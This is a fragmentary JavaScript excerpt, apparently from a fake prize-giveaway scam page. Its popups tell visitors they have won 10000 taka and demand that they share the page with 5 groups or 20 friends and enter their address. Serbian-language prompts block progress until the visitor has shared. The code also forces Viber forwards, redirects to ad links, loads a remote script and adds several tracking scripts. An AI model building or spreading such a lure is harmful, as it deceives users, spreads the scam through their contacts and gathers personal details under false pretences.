    ...
    (function() {
        ...
        hm.src = "https://hm.baidu.com/hm.js?be412ee83964eaa8303c3ce3f26cd5c5";
    ...
    window.addEventListener('touchstart', function() {
            ...
            _init: function() {
                setTimeout(function() {
                    Swal.fire({
                        ...
                        imageUrl: 'https://cdnbun.com/upload/sewyyz-img.jpg',
                        //  imageHeight: 227,
                                    ...
                                    jQuery(".div_img_gift, .img_gift").fadeIn("slow",
                                        function() {
                                            ...
                                            setTimeout(function() {
                                                Swal.fire({
                                                    title: 'Congratulation!',
                                                    html: '<p style="margin:10px 0;font-size: 14px;font-weight: 600;">You did it! You won  10000 taka</p><p style="margin:1px;">*** THE RULES ***</p><div style="text-align:center;"><p style="margin:1px;">1. You must tell 5 groups or 20 friends about our promotions.</p><p style="margin:1px;">2. Enter your address and complete registration.</p><p style="margin:1px;">3. The gifts will be delivered within 5-7 days</p></div>',
                                                    imageUrl: 'https://1.bp.blogspot.com/--tqT3kRP830/YKtbFdUwngI/AAAAAAAABkA/ua0BrYc9UHEhFF6yNKMMC78feZ7fPmrkwCLcBGAsYHQ/s16000/Bangladesh_outbox.png',
                                                    imageHeight: 180,
                                                    imageAlt: 'Custom image',
                                                }).then(function() {
                                                    puedo = false;
        ...
        // let's go!
        $.getScript('/j/ntb.php?c=postars-qll&m=postars-qll&tg=postars-qll&ln=postars-qll&vb=postars-qll&_t=1671974538332');
        ...
        var type_op = get_Cookie('type_op') == '' ? 1 : parseInt(get_Cookie('type_op'));
        console.log(type_op);
        if (type_op === 2) {
            showShare()
        }
        ...
        function continueBtn() {
            ...
            if (share_num < g_share_step) {
                swalert("Morate da podelite sa 5 prijatelja. Delite dok se plava linija ne napuni!", "Greška...");
            } else {
        ...
        function shareOkBtn() {
            window.open(Web + '&_a=vb&_p=Banner');
        }
        ...
        function fh() {
            location.href = Ads + '&_a=vb&_p=Banner';
        }
        ...
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?f2875507b7dafc62dc8493c81f61d036";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?a5ac763420b241ecd8a11dbedd6eb78b";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
        // google analytics
  ...
  function updateProgressBar() {
    ...
    if (currentProgress === 100) {
      var continueButton = document.getElementsByClassName('share_main_bt')[0];
      continueButton.innerHTML = '<a href="https://novi.kupujemprodajem.com/automobili/audi/audi-a4/oglas/146020572">Continue</a>';
      continueButton.removeAttribute('onclick');
    }
  }
var whatsappButton = document.getElementById('btn-viber');
...
var viberButton = document.getElementById('btn-viber');
viberButton.addEventListener('click', function() {
  window.location.href = 'viber://forward?text=https://novi.kupujemprodajem.com';
});
